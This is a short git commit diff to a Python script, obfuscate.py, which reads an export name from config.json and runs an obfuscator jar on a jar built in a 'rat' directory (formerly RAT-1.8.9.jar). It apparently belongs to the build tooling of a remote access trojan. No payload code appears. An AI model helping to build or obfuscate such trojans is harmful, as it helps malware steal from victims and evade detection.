2ae29f4003431bf8cc2551f3d11c56f0c5ee823f
Gute Nacht <93240515+dacianfan@users.noreply.github.com>
2022-10-28 19:57:15 -0400

    fixed obfuscator

--- obfuscate.py
+++ obfuscate.py
@@ -2,11 +2,16 @@ import os
 import time
 import threading
 import sys
+import json
 
+data = open("config.json")
+config = json.load(data)
+exportname = config["config"]["exportname"]
 cwd = os.getcwd()
 
+
 def obfuscate():
-    jar_path = f"{cwd}/rat/build/libs/RAT-1.8.9.jar"
+    jar_path = f"{cwd}/rat/build/libs/{exportname}.jar"
     obf_path = f"{cwd}/obf/obf.jar"
     cmd = f'java -jar "{obf_path}" "{jar_path}"'
     os.system(f"{cmd}")
